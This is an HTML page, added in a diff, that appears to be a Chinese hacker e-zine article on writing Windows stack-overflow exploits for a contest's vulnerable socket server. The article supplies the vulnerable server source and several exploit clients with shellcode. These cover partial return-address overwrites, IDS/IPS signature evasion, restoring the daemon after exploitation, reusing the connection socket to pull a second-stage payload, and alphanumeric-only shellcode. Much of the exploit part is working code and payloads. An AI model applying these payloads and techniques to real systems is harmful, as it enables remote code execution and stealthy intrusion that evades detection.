@@ -1,0 +1,383 @@
+﻿<html>
+<head>
+	<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+<title>做一个优秀的木匠</title>
+</head>
+<body>
+<pre style="width: 100%; word-wrap:break-word;">
+                          ==Ph4nt0m Security Team==
+ 
+                       Issue 0x01, Phile #0x03 of 0x06
+
+
+|=---------------------------------------------------------------------------=|
+|=---------------------=[       做一个优秀的木匠      ]=---------------------=|
+|=---------------------------------------------------------------------------=|
+|=---------------------------------------------------------------------------=|
+|=--------------------=[           By F.Zh             ]=--------------------=|
+|=---------------------------------------------------------------------------=|
+|=---------------------------------------------------------------------------=|
+
+
+    [本文内容可能会伤及到部分名人粉丝感情，作者表示仅为插科打诨之用，并无恶意]
+ 
+    有副图描述了从发现漏洞到最后盈利的过程，大概意思是研究人员发现了房子的漏洞，木
+匠针对漏洞造了一个梯子，最后脚本小子进屋偷东西。国内的圈子里面，玩票性质的安全爱好
+者大多不愿意做脚本小子，同时也不见得有足够的时间去找房子的漏洞，所以闲暇时候基本上
+做做木匠活当消遣。但木匠也是有三六九等的，有朱由校，有鲁班，也有就只能给地主老财家
+做楠木棺材的。作为一个有职业道德的木匠，显然应该努力向前面两个靠拢，因为只能做做楠
+木棺材的，未免也太失面子了。
+
+    这篇文章就从国内某著名破解论坛搞的科普竞赛开始，由一个楠木棺材级别的木匠挣扎
+着介绍一下放眼能够看到的技巧。在切入正题前，有必要介绍一下科普竞赛的背景和结果：
+大约是看到windows漏洞太值钱，破解组织也开始搞起了逆向和exploit，而且还以竞赛的方
+式来引起非木匠的关注。科普竞赛的题目是两道，如Sowhat所说
+(http://hi.baidu.com/secway/blog/item/cb121863a6af72640c33facf.html)，第二道题是
+可以Google到的，而第一道题显然是个送分题，因此科普竞赛实际上是个比手快的过程。最
+后结果是nop拿了第一，这个名字让人不禁联想到了五一国际劳动节和革命先烈鲜血的颜色，
+当然，我们依然怀着无比的敬仰和美好的期望，希望这个nop不是职业运动员参加了业余比赛。
+ 
+    先看看存在问题的程序。逆向很简单，但是为了方便，还是直接给出官方公布的源代码。
+具有严重自虐倾向的木匠请编译后用ida逆向一下，并自备低温蜡烛和爱心小皮鞭。
+ 
+========================和谐的分割线=================================
+#include&lt;iostream.h&gt;
+#include&lt;winsock2.h&gt;
+#pragma comment(lib, &quot;ws2_32.lib&quot;)
+void msg_display(char * buf)
+{
+  char msg[200];
+  strcpy(msg,buf);// overflow here, copy 0x200 to 200
+  cout&lt;&lt;&quot;********************&quot;&lt;&lt;endl;
+  cout&lt;&lt;&quot;received:&quot;&lt;&lt;endl;
+  cout&lt;&lt;msg&lt;&lt;endl;
+}
+void main()
+{
+  int sock,msgsock,lenth,receive_len;
+  struct sockaddr_in sock_server,sock_client;
+  char buf[0x200]; //noticed it is 0x200
+ 
+  WSADATA wsa;
+  WSAStartup(MAKEWORD(1,1),&amp;wsa);
+  if((sock=socket(AF_INET,SOCK_STREAM,0))&lt;0)
+  {
+    cout&lt;&lt;sock&lt;&lt;&quot;socket creating error!&quot;&lt;&lt;endl;
+    exit(1);
+  }
+  sock_server.sin_family=AF_INET;
+  sock_server.sin_port=htons(7777);
+  sock_server.sin_addr.s_addr=htonl(INADDR_ANY);
+  if(bind(sock,(struct sockaddr*)&amp;sock_server,sizeof(sock_server)))
+  {
+    cout&lt;&lt;&quot;binding stream socket error!&quot;&lt;&lt;endl;
+  }
+  cout&lt;&lt;&quot;**************************************&quot;&lt;&lt;endl;
+  cout&lt;&lt;&quot;     exploit target server 1.0     &quot;&lt;&lt;endl;
+  cout&lt;&lt;&quot;**************************************&quot;&lt;&lt;endl;
+  listen(sock,4);
+  lenth=sizeof(struct sockaddr);
+  do{
+    msgsock=accept(sock,(struct sockaddr*)&amp;sock_client,(int*)&amp;lenth);
+    if(msgsock==-1)
+    {
+      cout&lt;&lt;&quot;accept error!&quot;&lt;&lt;endl;
+      break;
+    }
+    else
+      do
+      {
+        memset(buf,0,sizeof(buf));
+        if((receive_len=recv(msgsock,buf,sizeof(buf),0))&lt;0)
+        {
+          cout&lt;&lt;&quot;reading stream message erro!&quot;&lt;&lt;endl;
+          receive_len=0;
+        }
+        msg_display(buf);//trigged the overflow
+      }while(receive_len);
+      closesocket(msgsock);
+  }while(1);
+  WSACleanup();
+}
+========================和谐的分割线=================================
+ 
+    如注释所言，这里是误把0x200长度的往200字符串里面拷贝了。其实这个问题并不具有
+代表性，比尔叔叔的手下们把widechar的长度算错过，把栈上的变量当堆释放过，把用户给的
+地址内容加1过，唯独没有昏到把16进制和10进制搞混。不过既然主办方这样写，我们也就这
+样看吧。实际上逆向出来后，作为一个模板可以覆盖ret，然后code page里面找jmp esp，然
+后这样那样，很简单就搞定exp了。尽管在冠军的答案中看到了这种方法的影子，楠木棺材级
+木匠还是要挥舞着手中的锯子说，这种程度只能去做洗脚盆。
+
+    好吧，那我们一步一步地看如果从洗脚盆程度提升到楠木棺材级别，并展望一下更高的
+层次。
+ 
+    首先是获取CPU的控制权问题。
+
+    dark spyrit在某期Phrack（记不清楚了）上提出可以用系统加载的dll上的指令码来跳
+转并获得控制权。这里有一个前提，因为很巧的你覆盖了一大堆东西后，ret退栈后esp指向
+你能够控制的代码，因此用一个jmp esp可以跳过来执行，剩下就是编写shellcode。但是，
+并不是说就只能用这个方法，或者说这个方法就最好。dark spyrit最大的贡献是提出了一
+个通用的方法，同马列主义毛泽东思想邓小平理论三个代表八荣八耻一样，虽然是放之四海
+而皆准的真理，不过到了中国，还是要要结合具体的国情来开展工作。拿jmp esp的东西往
+机器上一跑，不同的操作系统版本怎么办，/3gb模式怎么办？做洗脚盆的确可以区分着做出
+男用女用小孩用人妖用的，但是可能拿去用的人是超女的冠军，如果事先你不知道名字，只
+看长相，你说到底给那个盆子好？
+
+    所以造梯子的时候，最好还是根据实际情况来。一般来说，栈溢出时，对栈上的破坏情
+况不是很严重的话，在栈区域上可以看到很多上层函数的局部变量，而且这些局部变量往往
+是很有用的，比如凑巧就是你那个字符串的指针等。打栈上变量的主意有几个好处，首先你
+可以用其他更稳定的方法跳转到恶意字符串的开头，其次这可以给你多一些字节空间来存放
+shellcode，最后还可以防止一些ids/ips的检测。我们可以用下面一个简单的图示来把这
+三个优势混杂起来说明一下。
+ 
+&lt;--lower                                                upper--&gt;
+================================================================
+ var of vulnerable function   |  ret  |  var of upper function ...
+================================================================
+ NOP NOP NOP NOP NOP NOP NOP  |jmp esp|  shellcode
+================================================================
+ shellcode                    |jmp  ? |  var of upper function
+================================================================
+ 
+
+    第二行是马列主义方法，你一定会覆盖到ret，然后继续覆盖起码2个字节(eb xx往回跳转)。
+因此一些ids/ips的signature就写了，如果你超过xxoo个字节，就阻止发送。就算写得不好
+的signature起码也会检查你是否覆盖到了ret的四个字节，一些更严格的甚至只要覆盖到ret
+的第一个字节就报警，对于这样的情况，马列主义方法肯定是被扼杀了，但是第三行的具体国
+情方法还有一线机会逃脱检测，我们根本不用覆盖完ret的四个字节，只要利用栈上的变量，
+找一些特定的字节码就可以了。
+
+    说到这里还可以插播一个事情，去年一月份泄露出来的.ani溢出的exp，大家对那个覆
+盖了低两位的exp惊叹不已。这就是一个很好的例子：第一，你用最小的字节数完成了功能，
+最大限度避免了ids等的问题。第二，这个方法的稳定性还好。这样说其实是很抽象的，我们
+还是回到科普竞赛的代码上来看。
+
+    调用msg_display的时候传递进来了一个参数，在栈上表现出来是这个参数是紧接着ret
+地址后面的，如果我们仅覆盖到了ret地址，当CPU执行完msg_display返回时，esp刚好指向
+这个参数，这个时候只需要一个能达到jmp [esp]功能的地址，就能准确跳转到我们传入的
+字符串上去，显然，满足这个条件最好的指令就是0xc3(ret)。下面这个图简单地说明了这
+个问题。
+ 
+&lt;--lower                                                              upper--&gt;
+=============================================================================
+ var of vulnerable function  |  ret  |  ptr  | other var of upper function ...
+=============================================================================
+ ^---------------------------------------|
+
+    把图中的ret用一个内容为0xC3的地址A来覆盖，当msg_display返回时，返回到了A地址，
+再执行了一次0xC3(ret)指令，eip就跳到了字符串的开头。
+
+    这里的情况还是很简单的，实际exploiting中也许这个ptr离ret还有点距离，可能需要
+你pop几次，这个形式上同覆盖seh的利用方法相同，也算是一个巧合吧。
+
+    然后来说说0xC3地址的寻找。首先很遗憾的，如果你想用四个字节完全覆盖ret地址，
+没有一个通用地方。msvcrt.dll在相同sp的不同语言系统中相对固定，code page在相同语
+言不同版本系统中相对固定。注意，这里只是相对，碰上些特殊的情况，可能这些平时通用
+的地址根本就是无效的地址。再严格一些，如果这里地址必须符合某种编码规范，也许你更
+难找到可用的地址，更别说通用了。
+
+    洗脚盆级别的木匠到这里估计要晕倒了，棺材匠级别的应该还有点办法，两个解决方案：
+
+    第一、找一个替代产品来满足编码规范。比如0x7ffa1571是你要找的pop pop ret，没
+必要一定要用0x7ffa1571，也许用0x7ffa156e也可以，只要pop pop ret前面的指令无伤大
+雅就是。一个实际的例子是泄露出来的realplayer import那个，要找pop pop ret，但是符
+合编码规范的范围内找不到，作为替代找了一个 call xxx/ret xx，而且刚好call xxx还不
+会让程序崩溃。
+
+    第二、缩小覆盖面积。覆盖4个字节太痛苦了，少覆盖几个字节吧。x86的DWORD是低位
+在上的，所以你顺序覆盖的时候，首先覆盖了ret地址的低位。正常的ret值是返回到某个pe
+文件中，比如00401258，如果覆盖一个字节，那可能的地址范围是00401201~004012ff，如果
+覆盖2个字节，可能的地址范围在00400101~0040ffff。这么大的范围内一般容易找到满足
+要求的地址，而且更重要的是，pe文件版本固定的话，尽管加载的基地址可能会变化，但是由
+于基地址有个对齐的要求，低位（两个字节或更多）完全固定，这实际上是一个很好的提高稳
+定性的方法。现实中memcpy导致的问题用这种方法更有效，strcpy的麻烦些，不过好在只要
+说明问题就是，这里也不深究过多。马上给出第一个代码。
+ 
+========================和谐的分割线=================================
+#include &lt;winsock2.h&gt;
+#include &lt;stdio.h&gt;
+#pragma comment(lib, &quot;ws2_32&quot;)
+ 
+SOCKET ConnectTo(char *ip, int port)
+{
+    SOCKET s;
+    struct hostent *he;
+    struct sockaddr_in host;
+    if((he = gethostbyname(ip)) == 0)
+        return INVALID_SOCKET;
+    host.sin_port = htons(port);
+    host.sin_family = AF_INET;
+    host.sin_addr = *((struct in_addr *)he-&gt;h_addr);
+    if ((s = WSASocket(2, 1, 0, 0, 0, 0)) == -1)
+        return INVALID_SOCKET;
+    if ((connect(s, (struct sockaddr *) &amp;host, sizeof(host))) == -1)
+    {
+        closesocket(s);
+        return INVALID_SOCKET;
+    }
+    return s;
+}
+
+void main()
+{
+    char malicious[] =  &quot;\xcc&quot;
+                    &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
+                    &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
+                    &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
+                    &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
+                    &quot;OA@&quot;;
+    WSADATA wsaData;
+    if(WSAStartup(0x0101,&amp;wsaData) != 0)
+        return;
+    SOCKET s = ConnectTo(&quot;127.0.0.1&quot;, 7777);
+    send(s, malicious, 203, 0);  //hard encoded :)
+    WSACleanup();
+}
+========================和谐的分割线=================================
+
+    执行下顺利到达int3指令。
+
+    构造exp的过程本身是简单的，关键在shellcode实现功能上。洗脚盆木匠到这一步基本
+上就是找一个shellcode来用。作为一个有职业道德的棺材级木匠，可能还应该有点更高的
+追求：好的梯子除了能够通用而精确地干掉存在漏洞的机器外，同时还要方便使用者，绕过
+防火墙，而且还要尽可能少地影响到守护进程。对于网络程序，理想的情况是复用端口，终
+极目标是复用完了还不挂，后续的使用者能够正常使用守护进程的功能。后一点听起来似
+乎有点不可思议，而且流传在外面的各种exp，好像还罕有牛到这种程度，不过说穿了也没什
+么奇怪的，棺材级的木匠一般都能做到，只是马桶级木匠更喜欢散布马桶级exp而已。我们
+把复用端口的问题留在后面，先聊聊如何让守护进程不挂掉这个事情。
+
+    要程序不挂，最简单的办法就是恢复溢出时候的上下文，然后返回去。通常jmp esp的方
+法因为覆盖得太多，栈给洗脚盆木匠搞得一团糟，影响了太多上级函数的变量，导致根本没有
+什么好办法可以恢复。这个时候，尽可能少覆盖的优势出来了：由于最大限度地保存了上层
+函数局部变量，所以要做的就是恢复相关寄存器的值，然后寻找正常流程应该返回的地址，跳
+转回去即可。对于这里这个简单的daemon，我们甚至可以硬编码返回地址。还是把例子给出
+来，说明一下问题先。
+
+========================和谐的分割线=================================
+char malicious[] =
+&quot;\xCC&quot;
+&quot;LLLL`a&quot;
+&quot;\x50\x44\x44\x68\x55\x55\x55\x12\x44\x44\xc3&quot;
+&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
+&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
+&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
+&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
+&quot;OA@&quot;;
+========================和谐的分割线=================================
+
+    同前面一个代码相同，0xCC为了调试方便，改成0x90后再编译执行下，可以看见守护进程
+完全恢复了，你还可以telnet 7777过去正常执行功能，和没有发生过问题一样。这里恢复的
+代码用了一点小技巧，有兴趣的木匠可以仔细看看，代码`和a分别是pushad和popad，在这两
+个中间可以放置任何功能的shellcode，不影响整体的框架。
+
+    例子虽然简单，但是我建议读到这里的木匠还是跟进去看一下流程。由于这个实例比
+较直观，代码就简单恢复了上下文然后跳到正常地方执行，对于复杂点的代码，可能需要多
+费一点手脚，但是大体思路和步骤还是可以确定的：首先收集一个正常执行完出问题代码的
+寄存器和栈状态；然后确定要返回的地址，搜索或者硬编码，返回的地方可以是上一层，也可
+以返回上几层，甚至无耻地跳到入口让程序重新执行一次都可以；最后将恢复的代码编码成
+shellcode，加在正常功能shellcode的后面。
+
+    让守护进程不挂也做到了，接着看看端口复用的情况。
+    最简单的网络程序保留有一个SOCKET来通讯，很多已有的文章讨论了如何找到当前的
+SOCKET。最常用的方法是枚举所有可能的值，然后发送特征字符串来确认。也有人hook 
+recv，通过稍微被动一点的方法来获得SOCKET。当然这些都是懒人用的通用方法，对于特定
+的程序，简单而又稳妥的方法是直接找栈上的变量，消耗的代码少，而且一次性就能找到。
+如果编译优化的时候没有具体分配栈上的空间给这个socket，则它一定会被保存在某个寄
+存器里面，那就更简单了。针对具体的情况，像recv之类的函数也没有必要用很长的通用代
+码去搜索，只要在PE文件里面找找就成。具体的实现细节我们省略掉，给出代码，直接跟进
+去看看就知道了。
+
+========================和谐的分割线=================================
+
+void main()
+{
+    char malicious[] =  &quot;\x90&quot;
+                   
+                    &quot;LLLL`&quot;
+                    &quot;\x33\xd2\x66\xba\x10\x10\x2b\xe2\x33\xf6\x56\x52\x54\x53\x66\xb8&quot;
+                    &quot;\xe4\x90\xff\x10\x83\xec\x08\xff\xd4\x5d\x5d\x33\xd2\x66\xba\x10&quot;
+                    &quot;\x10\x03\xe2&quot;
+                    &quot;a&quot;
+                    &quot;\x50\x44\x44\x68\x55\x55\x55\x12\x44\x44\xc3&quot;
+                    &quot;&quot;
+                    &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
+                    &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
+                    &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
+                    &quot;OA@&quot;;
+    WSADATA wsaData;
+    if(WSAStartup(0x0101,&amp;wsaData) != 0)
+        return;
+    SOCKET s = ConnectTo(&quot;127.0.0.1&quot;, 7777);
+    send(s, malicious, 203, 0);
+
+    send(s, &quot;\xCC\xC3&quot;,2,0);
+    Sleep(-1);
+    WSACleanup();
+}
+========================和谐的分割线=================================
+
+    这里直接复用了当前的SOCKET，再次调用recv收了一段shellcode来执行，也就是后面看
+到的&quot;\xCC\xC3&quot;。自己再写个简单的shellcode就是，基本没有难度，只是注意要平衡栈，最
+后用个0xc3结尾。比较见鬼的是这个守护进程有recv但是没有send，所以shellcode里面你
+必须自己找到send的地址……娘西皮，还带这样玩的啊。
+
+    其他情况下的复用还有一些其他的方法，比如IIS 5这一类的，比如RPC一类的。前者寻
+找一个结构，后者hook一个函数，伪造或者搜索一个同时有in和out的opnum，具体细节baidu
+上能够搜索到，限于篇幅这里也不再废话了。如果对方是其他完成端口形式，比如ORACLE，只
+能暴力点shutdown掉当前监听，自己来监听一个。当然，也有没什么好方法的，比如IIS6。
+
+    上面的过程省略了没有技术含量的shellcode编写过程，主要说的是一些步骤，方法和技
+巧。稳定，复用，还有不挂掉守护进程，都作到了，洗脚盆也成功升级为了棺材匠，还有什么可
+以做的呢？
+
+    美观！这个shellcode简直不是一般的难看，混杂了可读的字符和不可读的字符，简直是
+丑陋不堪！你说一个木匠会把棺材做的全是毛刺么，不会雕龙刻凤的木匠永远是二流的。对
+于木匠来说，终极的目标是将一个exp发挥到极致，对于这样简单的一个情况，要用所有可见
+的字符，最好尽可能都是字母，甚至exp都不用，直接用个telnet就可以溢出获得shell了。
+
+    不可能么？当然是可能的，人有多大胆地有多大产，钱老还论证过亩产万斤是可行的呢。
+那么，还是给个sample。
+
+void main()
+{
+    char malicious[] =  &quot;`aZZZZZZZZZZZZZZZZZZTYXXXXfiAqcYfPAAeiAoHFXZPiAkj&quot;
+            &quot;brIPiAgVbaaPiAckwzOPLiAsloUWPiAZczabPiAVYDahPiARC&quot;
+            &quot;pDXPQlaatHWsaLtUAAAACFiaaPoHHmDahivabowabxANlKjPpp&quot;
+            &quot;ppPfqVfkzppQpBknrFJPPeruDecoOaeNtiPdPpPxSnLpHOoMd&quot;
+            &quot;AAAOA@&quot;;
+    WSADATA wsaData;
+    if(WSAStartup(0x0101,&amp;wsaData) != 0)
+        return;
+    SOCKET s = ConnectTo(&quot;127.0.0.1&quot;, 7777);
+    send(s, malicious, 203, 0);
+
+    send(s, &quot;\xCC\xC3&quot;,2,0);
+    Sleep(-1);
+    WSACleanup();
+}
+
+    这里两段shellcode，我们主要解决第一步的问题。要说明malicious到底是个什么东西，
+牵扯的面就太广了，我们假设看文章的木匠都是有汇编功底的，而且愿意反汇编进去看一下，
+就简单的提提，因为要写这个shellcode的构造，那又是一篇文章。shellcode里面首先平衡
+栈，然后对栈进行一些patch，patch出想要的指令，然后对后续数据进行解码操作，最后再执
+行。
+
+    这个code，运行顺利可以抓到一个0xCC，也就是第二个send的。但是，ret后守护进程还
+是挂了。
+
+    为了美观，我们exp的工作必须重头再来。开始我们把姿态定得很低，目的是说明问题，
+现在把最重要的几步都解决了，又回到了原点，各位木匠们，现在可以动起手来写一下完全符
+合可见字符编码的，复用当前SOCKET的第二段shellcode了。按照前面的步骤，应该不是很难
+的事情，让守护进程不挂也是可以的，malicious代码保留了革命的火种，发生溢出时的寄存
+器值，都保留在上面，剩下一点工作，只是比写普通shellcode稍微多费点劲的活，不想试试看
+么。
+
+    最后再卖个关子，棺材木匠说过，最终是可以由telnet提交的获得shell，连exp都不用的。
+telnet是一个字符一个字符提交的，有没有什么一次性提交203个字节导致第一次溢出呢？可
+以的，守护进程只有一个线程，打打这方面的主意，用个小技巧吧。
+ 
+
+-EOF-
+</pre>
+</body>
+</html>
